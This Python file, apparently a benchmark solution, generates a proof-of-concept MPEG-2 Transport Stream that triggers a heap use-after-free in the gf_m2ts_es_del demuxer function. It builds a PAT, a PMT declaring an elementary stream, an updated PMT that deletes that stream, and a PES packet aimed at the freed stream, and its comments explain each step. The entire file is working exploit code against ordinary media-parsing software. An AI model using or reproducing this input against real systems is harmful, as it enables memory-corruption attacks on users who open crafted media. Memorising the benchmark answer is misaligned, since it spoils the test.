import struct

class Solution:
    def _crc32_mpeg2(self, data: bytes) -> int:
        """
        Calculates the MPEG-2 CRC-32 for the given data.
        """
        crc = 0xFFFFFFFF
        for byte in data:
            crc ^= (byte << 24)
            for _ in range(8):
                if crc & 0x80000000:
                    crc = (crc << 1) ^ 0x04C11DB7
                else:
                    crc <<= 1
        return crc & 0xFFFFFFFF

    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) input that triggers a
        Heap Use After Free vulnerability in gf_m2ts_es_del.

        The PoC is an MPEG-2 Transport Stream (M2TS) file with 4 packets:
        1. PAT: Defines a program with a PMT at PID 0x0100.
        2. PMT (v0): Defines an elementary stream at PID 0x0101. This
           causes the allocation of an ES-handling structure.
        3. PMT (v1): An updated version of the PMT that removes the elementary
           stream. This causes the ES structure to be freed, but a dangling
           pointer remains in the PID-to-ES map.
        4. PES: A packet for the now-deleted elementary stream (PID 0x0101).
           Processing this packet attempts to use the dangling pointer,
           triggering the use-after-free.
        """
        poc_data = bytearray()

        # Packet 1: Program Association Table (PAT)
        # Header: PID 0x0000, PUSI=1, CC=0
        pat_header = bytes.fromhex('47400010')
        # Payload (pre-CRC): table_id=0, section_length=13, program_number=1, pmt_pid=0x0100
        pat_payload_pre_crc = bytes.fromhex('00b00d0001c100000001e100')
        pat_crc = self._crc32_mpeg2(pat_payload_pre_crc)
        pat_table = pat_payload_pre_crc + struct.pack('>I', pat_crc)
        
        pat_packet = bytearray(pat_header)
        pat_packet += b'\x00'  # Pointer field
        pat_packet += pat_table
        pat_packet += b'\xff' * (188 - len(pat_packet))
        poc_data += pat_packet

        # Packet 2: Program Map Table (PMT), Version 0
        # Header: PID 0x0100, PUSI=1, CC=0
        pmt_v0_header = bytes.fromhex('47410010')
        # Payload (pre-CRC): table_id=2, version=0, program_number=1,
        # defines one stream: type=0x1b (H.264), pid=0x0101
        pmt_v0_payload_pre_crc = bytes.fromhex('02b0120001c10000e101f0001be101f000')
        pmt_v0_crc = self._crc32_mpeg2(pmt_v0_payload_pre_crc)
        pmt_v0_table = pmt_v0_payload_pre_crc + struct.pack('>I', pmt_v0_crc)

        pmt_v0_packet = bytearray(pmt_v0_header)
        pmt_v0_packet += b'\x00'  # Pointer field
        pmt_v0_packet += pmt_v0_table
        pmt_v0_packet += b'\xff' * (188 - len(pmt_v0_packet))
        poc_data += pmt_v0_packet

        # Packet 3: Program Map Table (PMT), Version 1 (empty)
        # Header: PID 0x0100, PUSI=1, CC=1
        pmt_v1_header = bytes.fromhex('47410011')
        # Payload (pre-CRC): table_id=2, version=1 (updated), program_number=1,
        # stream list is now empty. This will trigger the free.
        pmt_v1_payload_pre_crc = bytes.fromhex('02b00d0001c30000e101f000')
        pmt_v1_crc = self._crc32_mpeg2(pmt_v1_payload_pre_crc)
        pmt_v1_table = pmt_v1_payload_pre_crc + struct.pack('>I', pmt_v1_crc)
        
        pmt_v1_packet = bytearray(pmt_v1_header)
        pmt_v1_packet += b'\x00'  # Pointer field
        pmt_v1_packet += pmt_v1_table
        pmt_v1_packet += b'\xff' * (188 - len(pmt_v1_packet))
        poc_data += pmt_v1_packet

        # Packet 4: Packetized Elementary Stream (PES) for the freed stream
        # Header: PID 0x0101, PUSI=1, CC=0
        pes_header = bytes.fromhex('47410110')
        # Payload: A minimal PES packet header.
        pes_payload = bytes.fromhex('000001e000008080052100010001')

        pes_packet = bytearray(pes_header)
        pes_packet += pes_payload
        pes_packet += b'\xff' * (188 - len(pes_packet))
        poc_data += pes_packet

        return bytes(poc_data)